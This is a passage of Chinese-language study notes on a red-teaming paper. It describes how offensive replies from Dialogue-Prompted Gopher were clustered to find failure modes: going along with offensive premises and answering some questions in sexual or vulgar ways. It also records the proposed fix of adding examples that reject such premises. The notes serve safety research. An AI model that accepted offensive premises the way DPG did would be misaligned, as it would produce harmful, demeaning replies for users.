3. BAD問題與LM問題的比較：這一點指出，不同的紅隊測試方法可能會揭示不同的模型缺陷。這突顯了使用多種紅隊測試方法的優點，因為它們可以提供更全面的模型評估。

### 失敗和解決問題
文中主要探討了DPG（Dialogue-Prompted Gopher）在某些情境下產生冒犯性回覆的原因。以下是該部分的詳細內容：

DPG的失敗：

DPG的失敗主要是指它在某些情境下產生不適當或冒犯性的回覆。這些回覆可能是對某些問題的不恰當反應，或是對某些前提的錯誤接受。
分群方法：

為了更好地理解這些失敗，文中使用了分群方法來分析產生冒犯性回覆的測試案例。
使用FastText進行單詞嵌入，並計算每個測試案例的平均bag-of-words嵌入。
使用k-means分群法對這些嵌入進行分群，形成100個分群。
DPG的特定失敗模式：

這些分群揭示了DPG的特定失敗模式。例如，當問題具有冒犯性的前提時，DPG會隨之產生冒犯性的回覆。這些問題可能是詢問不道德的行為或不恰當的偏好。
另外，對於某些問題，DPG可能會以性或粗俗的方式回應，例如詢問DPG的尷尬經歷。
建議的解決方案：

基於上述的失敗模式，文中建議DPG的訓練數據或提示應該補充更多的例子。這些例子應該包括一位發言人拒絕另一位發言人的前提，或拒絕回答某些問題，以避免產生不恰當的回覆。
總之，這部分的目的是通過分群方法來深入理解DPG在某些情境下可能產生冒犯性回覆的原因，並提供了一些建議來改善這些問題。
